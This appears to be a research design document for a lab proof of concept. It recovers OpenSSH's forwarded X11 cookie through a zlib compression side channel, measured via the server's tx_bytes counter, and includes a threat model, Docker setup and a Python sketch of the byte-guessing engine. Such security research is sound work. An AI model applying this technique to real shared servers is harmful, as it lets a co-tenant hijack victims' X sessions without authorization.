# x11-fwd: server→client X11 cookie exfiltration

**Status:** design
**Date:** 2026-04-29
**Variant codename:** `x11-fwd`
**Folder:** `x11-variant/` (standalone PoC, fresh codebase, no imports from existing
`attacker/` / `client/` / `server/` trees)

## 1. Goal

Recover the 16-byte fake MIT-MAGIC-COOKIE-1 proxy cookie that OpenSSH's
`x11_request_forwarding_with_spoofing` generates per session, by observing the
compressed SSH stream's server→client byte counter while injecting chosen
plaintext through the victim's X11 forward TCP socket. After recovery, the
attacker reconnects to the same socket using the cookie and obtains an
authenticated X11 connection to the victim's local X server (untrusted access
via the SSH client's swap to the SECURITY-extension cookie).

## 2. Threat model

The attacker is a **separate unprivileged Unix user on the same machine as
sshd**. Their capabilities are exactly what a co-tenant has on a stock Debian
server:

- Read world-readable sysfs entries, including
  `/sys/class/net/<iface>/statistics/tx_bytes`.
- Open TCP connections to any localhost-bound port (TCP loopback has no
  UID-based ACLs).
- Run user-level processes; no `CAP_NET_RAW`, no `sudo`, no privileged caps.

What they explicitly **cannot** do:

- Read `/home/victim/.Xauthority` (mode 0600).
- Sniff packets on `eth0` (no `CAP_NET_RAW`).
- Run code in the victim's processes.

The victim runs `ssh -X victim@server` from their workstation to a multi-user
host where the attacker has a shell. The SSH session compression algorithm is
zlib (`Compression yes` / `zlib@openssh.com`); cipher is
`chacha20-poly1305@openssh.com` (pinned in both client and server config for
this PoC).

## 3. Why server→client (and why this attack target is real)

OpenSSH always spoofs the X11 cookie in `x11-req`, regardless of whether
`-X` (untrusted) or `-Y` (trusted) was requested:
`x11_request_forwarding_with_spoofing` generates a fresh random "fake" proxy
cookie per session, sends *that* in `x11-req`, and stores both the fake and
the actual cookie (the user's `~/.Xauthority` cookie for `-Y`, or the
SECURITY-extension temporary cookie for `-X`) for later swap. When the SSH
client receives an X11 channel-open from the server, `x11_open_helper`
validates the fake cookie and swaps in the saved cookie before forwarding to
the local X server.

So:

- The cookie that travels server→client over the SSH tunnel (in X11
  connection-setup messages from server-side X11 clients) is the **fake**
  cookie. This is our recovery target.
- The fake cookie authenticates against the SSH server's X11 forward TCP port
  (`127.0.0.1:60NN` on the server). Anyone who can connect to that port and
  speak X11 with the right cookie obtains an authenticated session that the
  SSH client will forward to the victim's local X server (with cookie swap).
- Mode 0600 on `~/.Xauthority` blocks the attacker from reading the fake
  cookie directly. The compression side channel is the only path.

## 4. Attack mechanics

The X11 connection-setup message sent by any X11 client over the forward
contains, at offset 12, the fixed string `"MIT-MAGIC-COOKIE-1"` (18 bytes)
followed by 2 bytes of padding (`0x00 0x00`), followed by the 16-byte cookie.
That's a **20-byte fixed prefix** the attacker can use as an LZ77 anchor.

When `xset q` (or any X11 client) connects to `$DISPLAY`, the SSH server reads
the connection-setup bytes from its loopback listener, wraps them in
`SSH_MSG_CHANNEL_OPEN("x11")` followed by `SSH_MSG_CHANNEL_DATA`, and ships
them server→client through the compressed SSH stream. The cookie now sits in
the LZ77 window.

The attacker, from a separate process on the same machine, opens TCP to
`127.0.0.1:60NN` and writes:

```
b"MIT-MAGIC-COOKIE-1\x00\x00" + recovered_prefix + candidate_byte + alignment_padding
```

The SSH server treats the attacker's connection as another X11 client,
wraps these bytes in another `CHANNEL_OPEN(x11)` + `CHANNEL_DATA`, and ships
*them* server→client through the same compressed stream. zlib's LZ77 finds
that `"MIT-MAGIC-COOKIE-1\x00\x00"` matches the same anchor in the recent
window, and extends the back-reference through the cookie bytes for as long
as `recovered_prefix + candidate_byte` matches the actual cookie. A correct
candidate produces a measurably smaller compressed output than wrong ones.

The attacker observes the compressed packet size by reading
`/sys/class/net/eth0/statistics/tx_bytes` before and after the injection
and taking the delta. The 8-way alignment sweep (`0..7` extra padding bytes
in the alignment slot) defeats the
`chacha20-poly1305@openssh.com` 8-byte packet-boundary granularity that
would otherwise mask single-byte compression wins.

## 5. Container topology

Two services in `x11-variant/docker-compose.yml`:

### 5.1 `client` ("victim's workstation")

- Base: `debian:stable`
- Packages: `openssh-client`, `xvfb`, `x11-xserver-utils`, `python3`,
  `python3-aiohttp`
- Entrypoint launches `Xvfb :0 -extension SECURITY` (the SECURITY extension is
  required because `ssh -X` calls `xauth generate ... untrusted` against the
  local X server), then execs `harness.py`.
- One non-root user `victim`; harness runs as `victim`.
- Harness exposes an HTTP control port (used by the engine for `/trigger`).

### 5.2 `server` ("multi-user SSH host")

- Base: `debian:stable`
- Packages: `openssh-server`, `xauth`, `x11-xserver-utils` (for `xset`),
  `python3`, `python3-aiohttp`
- Two unprivileged users:
  - `victim` — accepts SSH login (key-based, key provisioned at build time
    or by harness); home dir mode `0700` so `attacker` cannot read it.
  - `attacker` — runs the attack engine; deliberately constrained: no sudo,
    no membership in any group that would grant access to `/home/victim`,
    no `CAP_NET_RAW`.
- `sshd_config`: `X11Forwarding yes`, `X11UseLocalhost yes`, `ClientAliveInterval 0`,
  `Ciphers chacha20-poly1305@openssh.com`, `Compression yes`.
- Entrypoint starts sshd, then execs the engine entry as `su attacker -c …`
  so engine privileges are enforced by the OS.

### 5.3 Topology rationale

Both endpoints must be different network entities so that the SSH compressed
stream has a real `eth0` to traverse — the `tx_bytes` counter on the server's
container interface is meaningful only because traffic actually leaves the
container. An all-loopback single-container setup wouldn't expose the bytes
on the eth0 counter.

`docker exec` access to both containers is a **harness-only** capability
(used for ground-truth capture and port discovery). The engine never uses it
and would not have access in a real deployment.

## 6. Per-trial flow

A trial = one fresh SSH session = one fake proxy cookie to recover.

```
trial(trial_id):
  # === SETUP (harness on client) ===
  1. Spawn ssh -X -T victim@server bash with stdin/stdout pipes.
     - -X: untrusted X11 forwarding (matches threat model)
     - -T: no PTY allocation (simpler stdin piping; SSH compression is
           identical regardless)
     The bash session stays open; harness writes commands to stdin and reads
     stdout for synchronization.

  2. Handshake-sync. Write `echo __READY__\n` to ssh stdin, read stdout
     until __READY__ appears. Confirms session is established and X11
     forwarding has been negotiated.

  3. Capture ground-truth cookie OUT OF BAND of the SSH stream:
        docker exec -u victim server xauth -f ~/.Xauthority nlist
     Parse the 16-byte cookie. Used only post-attack for grading; engine
     never sees it.

  4. Discover TARGET_PORT, also OUT OF BAND:
        docker exec -u victim server ss -tlnp 'sport >= :6010 sport <= :6100'
     Pick the 60NN port sshd bound for this session. Passed to the engine
     in step 5; this is fine because port discovery (`ss -tlnp`) is trivially
     within attacker-user capabilities anyway.

  5. POST /trial/start to the engine:
        {"trial_id": ..., "target_port": <port>}

  # === ATTACK (engine, runs as `attacker` inside server container) ===
  6. Round-based guess loop. Per measurement:
     a. POST /trigger to harness:
            harness writes `xset q >/dev/null; echo __TRIG_<m>__\n` to ssh stdin
            harness reads ssh stdout until __TRIG_<m>__ appears
            harness returns 200
        Effect: an X11 client (xset) connects through the forward, sending
        an X11 connection-setup with the cookie. The bytes flow
        server→client through the SSH session and enter the LZ77 window.
        xset's own stdout suppressed via >/dev/null; only ~13 bytes of
        sentinel echo are added to the window.
     b. before = read /sys/class/net/eth0/statistics/tx_bytes
     c. probe = b"MIT-MAGIC-COOKIE-1\x00\x00" + prefix + candidate + alignment
        Open TCP 127.0.0.1:TARGET_PORT, sendall(probe), close.
     d. await asyncio.sleep(SETTLE_S)   # ~150 ms
     e. after = read tx_bytes; observed_size = after - before

  7. On convergence (every byte position locked at margin >= MIN_MARGIN):
        return {"recovered_cookie": <hex>}

  # === VERIFY ===
  8. harness compares recovered_cookie to ground-truth (step 3).
  9. End-to-end auth check: POST /e2e_check to engine with recovered_cookie.
     Engine opens 127.0.0.1:TARGET_PORT, sends a complete minimal X11
     connection-setup (12-byte header + "MIT-MAGIC-COOKIE-1" + 2 padding +
     16-byte cookie). The SSH client's x11_open_helper swaps in the
     SECURITY-temp cookie, forwards to Xvfb, which replies with success
     byte 0x01 if auth succeeded. Engine reports success/failure.

  # === TEARDOWN ===
  10. Harness writes `exit\n` to ssh stdin. SSH session closes, sshd deletes
      the per-session xauth entry, fake cookie is permanently invalidated.
```

## 7. Engine

Standalone, minimal: round-based ranking, no fork-on-stall, no
candidate-elimination cache, no alignment-hint carryover.

```python
# server/attacker/engine.py — sketch

ALIGNMENT_POOL = bytes(range(0x80, 0x90))   # high-bit-set, won't collide
                                            # with cookie bytes
MIN_MARGIN = 8           # bytes between #1 and #2 to lock a position
MIN_AGREEMENT = 5        # of 8 alignments must agree on the winner
MAX_ROUNDS = 16
SETTLE_S = 0.15

async def run_attack(target_port: int) -> bytes:
    recovered = b""
    for byte_index in range(16):
        winner = await find_next_byte(target_port, recovered, byte_index)
        recovered += winner
    return recovered

async def find_next_byte(target_port, prefix, byte_index) -> bytes:
    candidates = [bytes([c]) for c in range(256)]
    samples = {c: [] for c in candidates}

    for _ in range(MAX_ROUNDS):
        for cand in candidates:
            for align_len in range(8):
                size = await measure_once(target_port, prefix, cand, align_len)
                samples[cand].append(size)

        ranked = sorted(candidates, key=lambda c: statistics.median(samples[c]))
        if locked(ranked, samples, MIN_MARGIN, MIN_AGREEMENT):
            return ranked[0]

    raise RecoveryFailed(f"position {byte_index}")

async def measure_once(target_port, prefix, candidate, align_len) -> int:
    await trigger_via_harness()
    before = read_tx_bytes()
    probe = b"MIT-MAGIC-COOKIE-1\x00\x00" + prefix + candidate + ALIGNMENT_POOL[:align_len]
    s = socket.create_connection(("127.0.0.1", target_port))
    s.sendall(probe); s.close()
    await asyncio.sleep(SETTLE_S)
    after = read_tx_bytes()
    return after - before
```

**Ranking.** The candidate with the smallest median compressed size wins.
A position is locked when the gap between #1 and #2 is ≥ MIN_MARGIN bytes
*and* candidate #1 is the median-winner on ≥ MIN_AGREEMENT of the 8
alignments.

**Alphabet.** Full 8-bit (256 candidates). The cookie comes from
`arc4random()`, so every byte value is possible.

**No flush.** Unlike `direct`, we *want* the cookie in the LZ77 window —
that's the whole point. xset q's recent re-injection keeps it there.

## 8. Noise & measurement integrity

Sources of bytes that show up in `tx_bytes` during the measurement window
are managed as follows:

- **SSH keepalives:** disabled via `-o ServerAliveInterval=0
  -o ServerAliveCountMax=0` and matching `ClientAliveInterval 0`. No periodic
  pings.
- **Container background traffic:** server container runs only sshd and the
  attacker engine. No DNS resolver, no NTP, no apt cron. Compose service has
  `dns: 127.0.0.1` to neutralize lookups.
- **`/trigger` HTTP traffic** (engine → harness, server → client over docker
  bridge): occurs *before* the `before` reading, so it does not contribute
  to the `(after - before)` delta.
- **`xset q` traffic and sentinel echo:** likewise drained back through the
  SSH session before `before` is sampled.
- **Attacker's TCP write to `127.0.0.1:60NN`:** loopback, doesn't touch
  eth0.
- **TCP ACKs from client to server:** these are `rx_bytes` (incoming),
  not `tx_bytes`.
- **TCP segmentation jitter:** OpenSSH sets `TCP_NODELAY` for interactive
  sessions, so each SSH packet ships in its own segment without Nagle
  delay.

**Cipher pinning.** `Ciphers chacha20-poly1305@openssh.com` in both client
and server configs. At trial start, the harness asserts the negotiated
cipher (parse `ssh -vv` output for `kex: client->server cipher:` or use
`ssh -Q cipher`). Abort with a clear error if anything else is negotiated
(e.g., AES-GCM with 16-byte alignment) — the alignment sweep would otherwise
silently produce wrong results.

**Statistical signal extraction.** Per-measurement absolute size includes
constant overhead (TCP/IP framing, CHANNEL_OPEN, CHANNEL_CLOSE) which
cancels in candidate-vs-candidate comparisons. Median-over-alignments-and-
rounds smooths residual jitter. The engine ranks on relative deltas only.

**Known robustness knob:** if `tx_bytes` undercounts because the SSH packet
hasn't drained from sshd's TCP send buffer to the kernel interface queue
within `SETTLE_S`, fall back to `ethtool -S eth0 | grep tx_packets` (richer,
queue-level stats) or extend `SETTLE_S`. This is an implementation-time
tuning question.

## 10. Code style

Default to writing no comments. Add a comment only when the *why* is
non-obvious — a hidden protocol constraint, a workaround for specific
OpenSSH/zlib behavior, or a subtle invariant that would surprise a
reader. Don't explain *what* the code does (well-named identifiers
carry that), and don't reference the current task or PR ("added for X
flow") — those rot. Module-level docstrings are fine when they describe
a non-obvious contract; one-line per-symbol docstrings that paraphrase
the name are not.

## 11. Success criteria

A trial is **successful** if:

1. Engine returns a 16-byte hex cookie within the round budget.
2. Recovered cookie matches the ground-truth fake cookie.
3. End-to-end auth check (engine reconnects to `127.0.0.1:60NN` with
   recovered cookie, sends real X11 connection-setup) returns Xvfb's
   `0x01` success byte.
4. Every position 0–15 was decided with margin ≥ `MIN_MARGIN`.

**Definition of done:** `scripts/run_trial.py` completes successfully
end-to-end (one passing trial). Multi-trial benchmarks and statistical
robustness measurements are out of scope for this PoC.

## 12. Risks & open knobs

Carry into the implementation plan:

- `tx_bytes` granularity vs. `SETTLE_S`: tune empirically; fall back to
  `ethtool -S` if needed.
- `xset q` runtime variance: typically ~50–100 ms; widen `SETTLE_S` if
  variance is observed.
- 256-candidate alphabet × 8 alignments × 16 positions × ~4 rounds ≈
  130 000 measurements at ~150 ms each ≈ ~5 hours per trial worst case.
  Likely overestimate; if real wall-clock is too slow, candidate-elimination
  is the obvious next optimization (deferred — not in this PoC).
- ChaCha20-Poly1305 assumption: enforced by config + assertion at trial
  start. AES-GCM/AES-CTR support is a future variant, not this one.

## 13. Out of scope

- Multi-trial benchmarking, statistical accuracy across many cookies.
- Attacking AES ciphers (different alignment granularity).
- Attacking `-Y` (trusted) mode specifically. The mechanics are identical
  because the cookie on the wire is the fake either way; the only difference
  is what the SSH client swaps in on receive (`-X` swaps to SECURITY-temp,
  `-Y` swaps to the user's `~/.Xauthority` cookie). The PoC pins `-X`.
- Active interference with the victim's session (we observe naturally
  occurring xset triggers via the harness; we do not, e.g., spoof X11
  channels or hijack live connections).
- Recovery of the user's "real" `~/.Xauthority` cookie. The fake cookie
  is sufficient to authenticate against the SSH-forwarded X server, which
  is the attack's value proposition under this threat model.
